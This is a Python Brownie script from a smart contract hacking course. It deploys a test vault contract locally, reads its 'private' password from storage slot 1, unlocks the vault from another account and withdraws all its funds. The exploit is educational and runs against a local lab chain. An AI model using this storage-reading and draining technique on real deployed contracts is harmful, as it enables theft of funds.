# 2023 Console Cowboys Python Smart Contract Hacking Course
# @author Olie Brown @ficti0n
# http://cclabs.io 

from brownie import accounts, config, ColdStorageVault
from web3 import Web3
import re

web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))
account0 = accounts[0]
account1 = accounts[1]


def DeployColdStorageVault():
    """Deploy the contract and check the is_locked Value, than Grab password out of private storage"""
    cold_storage = ColdStorageVault.deploy("test123",{"from": account0, "value": 3000000000000000000})
    return cold_storage
    

def GetPrivatePassword(cold_storage):
    """Get the private variable password from memory and set it to a return variable"""
    contract_address = str(cold_storage)
    password = web3.eth.getStorageAt(contract_address, 1).decode() #decode converts from bytes to string
    password = re.sub('[^0-9a-zA-Z]','',password)
    print (f'Password: {password}')  
    return password


def UnlockAndWithdraw(password, cold_storage):
    """Unlock the contract with the password and withdraw all the funds to attacks account"""
    is_locked = cold_storage.is_locked() #grab is_locked Value
    if is_locked:
        print (f'Locked: {is_locked} preparing to unlock...')
        is_locked = cold_storage.is_locked()
        cold_storage.unlock(password,{"from": account1})
        is_locked = cold_storage.is_locked()

        #If wrong password and still locked 
        if is_locked:
            print("incorrect password sent")
        else:
            print(f"Contract Unlocked...")
            print(f'Starting Balance: {account1.balance()} ')
            print("Withdrawing all funds")
            cold_storage.WithdrawAll({"from": account1})
            print(f'Balance after attack: {account1.balance()}')
    

def main():
    cold_storage = DeployColdStorageVault()
    password = GetPrivatePassword(cold_storage)
    UnlockAndWithdraw(password,cold_storage)
